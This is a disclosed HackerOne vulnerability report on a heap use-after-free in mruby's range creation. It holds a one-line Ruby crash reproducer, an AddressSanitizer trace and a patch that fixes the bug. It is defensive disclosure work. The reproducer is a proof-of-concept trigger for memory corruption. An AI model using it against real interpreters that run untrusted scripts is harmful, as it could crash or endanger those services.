# Heap use-after-free during range creation

## Report Details
- **Report ID**: 194884
- **URL**: https://hackerone.com/reports/194884
- **State**: Closed
- **Severity**: low
- **Submitted**: 2016-12-30T22:45:58.314Z
- **Disclosed**: 2017-02-07T01:23:46.866Z

## Reporter
- **Username**: titanous
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: shopify-scripts

## Vulnerability Information
`range_check` can trigger a stack extension via `mrb_funcall` if there are many arguments passed to the equivalence test. The stack extension changes the address of the stack, though the old stack address is used when assigning the value of the range. This causes a write into the old heap allocation, which has already been freed. This may be exploitable, but I didn't spend too much time exploring it.

 This program demonstrates the crash:

```ruby
[][0,0]..[1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1]
```

Here's the ASAN report:

```text
==30925==ERROR: AddressSanitizer: heap-use-after-free on address 0x61d00001e090 at pc 0x0000004ae8ac bp 0x7ffc0a539cd0 sp 0x7ffc0a539480
WRITE of size 16 at 0x61d00001e090 thread T0
    #0 0x4ae8ab in __asan_memcpy (/vagrant/bin/mruby+0x4ae8ab)
    #1 0x646186 in mrb_vm_exec /vagrant/src/vm.c:2414:27
    #2 0x61e2eb in mrb_vm_run /vagrant/src/vm.c:772:10
    #3 0x64a628 in mrb_top_run /vagrant/src/vm.c:2490:12
    #4 0x674229 in mrb_load_exec /vagrant/mrbgems/mruby-compiler/core/parse.y:5755:7
    #5 0x674ec5 in mrb_load_file_cxt /vagrant/mrbgems/mruby-compiler/core/parse.y:5764:10
    #6 0x4f3af5 in main /vagrant/mrbgems/mruby-bin-mruby/tools/mruby/mruby.c:232:11
    #7 0x7facbbfc1f44 in __libc_start_main /build/eglibc-oGUzwX/eglibc-2.19/csu/libc-start.c:287
    #8 0x41a505 in _start (/vagrant/bin/mruby+0x41a505)

0x61d00001e090 is located 16 bytes inside of 2048-byte region [0x61d00001e080,0x61d00001e880)
freed by thread T0 here:
    #0 0x4c4c0d in realloc (/vagrant/bin/mruby+0x4c4c0d)
    #1 0x5bfde5 in mrb_default_allocf /vagrant/src/state.c:60:12
    #2 0x550396 in mrb_realloc_simple /vagrant/src/gc.c:201:8
    #3 0x5509e4 in mrb_realloc /vagrant/src/gc.c:215:8
    #4 0x64ade2 in stack_extend_alloc /vagrant/src/vm.c:155:33
    #5 0x617db1 in stack_extend /vagrant/src/vm.c:172:5
    #6 0x61591f in mrb_funcall_with_block /vagrant/src/vm.c:394:7
    #7 0x613c3c in mrb_funcall_argv /vagrant/src/vm.c:432:10
    #8 0x613745 in mrb_funcall /vagrant/src/vm.c:323:10
    #9 0x5b564b in range_check /vagrant/src/range.c:40:10
    #10 0x5b4ec2 in mrb_range_new /vagrant/src/range.c:52:3
    #11 0x646099 in mrb_vm_exec /vagrant/src/vm.c:2414:27
    #12 0x61e2eb in mrb_vm_run /vagrant/src/vm.c:772:10
    #13 0x64a628 in mrb_top_run /vagrant/src/vm.c:2490:12
    #14 0x674229 in mrb_load_exec /vagrant/mrbgems/mruby-compiler/core/parse.y:5755:7
    #15 0x674ec5 in mrb_load_file_cxt /vagrant/mrbgems/mruby-compiler/core/parse.y:5764:10
    #16 0x4f3af5 in main /vagrant/mrbgems/mruby-bin-mruby/tools/mruby/mruby.c:232:11
    #17 0x7facbbfc1f44 in __libc_start_main /build/eglibc-oGUzwX/eglibc-2.19/csu/libc-start.c:287

previously allocated by thread T0 here:
    #0 0x4c4c0d in realloc (/vagrant/bin/mruby+0x4c4c0d)
    #1 0x5bfde5 in mrb_default_allocf /vagrant/src/state.c:60:12
    #2 0x550396 in mrb_realloc_simple /vagrant/src/gc.c:201:8
    #3 0x5509e4 in mrb_realloc /vagrant/src/gc.c:215:8
    #4 0x551323 in mrb_malloc /vagrant/src/gc.c:236:10
    #5 0x5513bd in mrb_calloc /vagrant/src/gc.c:254:9
    #6 0x616b79 in stack_init /vagrant/src/vm.c:92:28
    #7 0x614950 in mrb_funcall_with_block /vagrant/src/vm.c:360:7
    #8 0x61436a in mrb_funcall_with_block /vagrant/src/vm.c:338:13
    #9 0x613c3c in mrb_funcall_argv /vagrant/src/vm.c:432:10
    #10 0x524317 in mrb_obj_new /vagrant/src/class.c:1396:3
    #11 0x53edee in mrb_exc_new_str /vagrant/src/error.c:32:10
    #12 0x5484ee in mrb_init_exception /vagrant/src/error.c:534:20
    #13 0x6a29f0 in mrb_init_core /vagrant/src/init.c:41:3
    #14 0x5bfd85 in mrb_open_core /vagrant/src/state.c:47:3
    #15 0x5bff2c in mrb_open_allocf /vagrant/src/state.c:107:20
    #16 0x5bfefa in mrb_open /vagrant/src/state.c:99:20
    #17 0x4f29d3 in main /vagrant/mrbgems/mruby-bin-mruby/tools/mruby/mruby.c:172:20
    #18 0x7facbbfc1f44 in __libc_start_main /build/eglibc-oGUzwX/eglibc-2.19/csu/libc-start.c:287

SUMMARY: AddressSanitizer: heap-use-after-free (/vagrant/bin/mruby+0x4ae8ab) in __asan_memcpy
Shadow bytes around the buggy address:
  0x0c3a7fffbbc0: fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd
  0x0c3a7fffbbd0: fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd
  0x0c3a7fffbbe0: fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd
  0x0c3a7fffbbf0: fd fd fa fa fa fa fa fa fa fa fa fa fa fa fa fa
  0x0c3a7fffbc00: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa
=>0x0c3a7fffbc10: fd fd[fd]fd fd fd fd fd fd fd fd fd fd fd fd fd
  0x0c3a7fffbc20: fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd
  0x0c3a7fffbc30: fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd
  0x0c3a7fffbc40: fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd
  0x0c3a7fffbc50: fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd
  0x0c3a7fffbc60: fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd
Shadow byte legend (one shadow byte represents 8 application bytes):
  Addressable:           00
  Partially addressable: 01 02 03 04 05 06 07
  Heap left redzone:       fa
  Heap right redzone:      fb
  Freed heap region:       fd
  Stack left redzone:      f1
  Stack mid redzone:       f2
  Stack right redzone:     f3
  Stack partial redzone:   f4
  Stack after return:      f5
  Stack use after scope:   f8
  Global redzone:          f9
  Global init order:       f6
  Poisoned by user:        f7
  Container overflow:      fc
  Array cookie:            ac
  Intra object redzone:    bb
  ASan internal:           fe
  Left alloca redzone:     ca
  Right alloca redzone:    cb
==30925==ABORTING
```

This patch fixes the bug:

```patch
From ec7d6b4078f25bcc7c25b210e2d69c910ea9b923 Mon Sep 17 00:00:00 2001
From: Jonathan Rudenberg <jonathan@titanous.com>
Date: Fri, 30 Dec 2016 17:44:25 -0500
Subject: [PATCH] Fix heap use-after-free during range creation

---
 src/vm.c | 3 ++-
 1 file changed, 2 insertions(+), 1 deletion(-)

diff --git a/src/vm.c b/src/vm.c
index cca0fd03..368b75a9 100644
--- a/src/vm.c
+++ b/src/vm.c
@@ -2411,7 +2411,8 @@ RETRY_TRY_BLOCK:
     CASE(OP_RANGE) {
       /* A B C  R(A) := range_new(R(B),R(B+1),C) */
       int b = GETARG_B(i);
-      regs[GETARG_A(i)] = mrb_range_new(mrb, regs[b], regs[b+1], GETARG_C(i));
+      mrb_value res = mrb_range_new(mrb, regs[b], regs[b+1], GETARG_C(i));
+      regs[GETARG_A(i)] = res;
       ARENA_RESTORE(mrb, ai);
       NEXT;
     }
-- 
2.11.0
```


## Attachments
No attachments
